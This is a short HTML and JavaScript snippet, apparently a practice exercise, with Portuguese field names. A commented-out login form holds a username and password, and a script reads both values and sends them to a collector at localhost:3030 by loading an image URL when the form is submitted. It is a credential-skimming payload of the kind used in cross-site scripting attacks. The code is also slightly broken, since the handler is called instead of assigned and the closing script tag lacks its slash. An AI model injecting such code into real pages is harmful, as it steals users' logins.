/*<form action="/" method="post">
    <input type="text" name="usuario" value="victor">
    <input type="password" name="senha" value="123">
</form>
*/

<script>
    function enviar(){
        var usuario = document.forms[0].elements[0].value;
        var senha = document.forms[0].elements[1].value;
        new Image().src = "http://localhost:3030/?usuario="+ usuario + "&senha=" + senha;
    }

    document.forms[0].onsubmit = enviar();
<script>
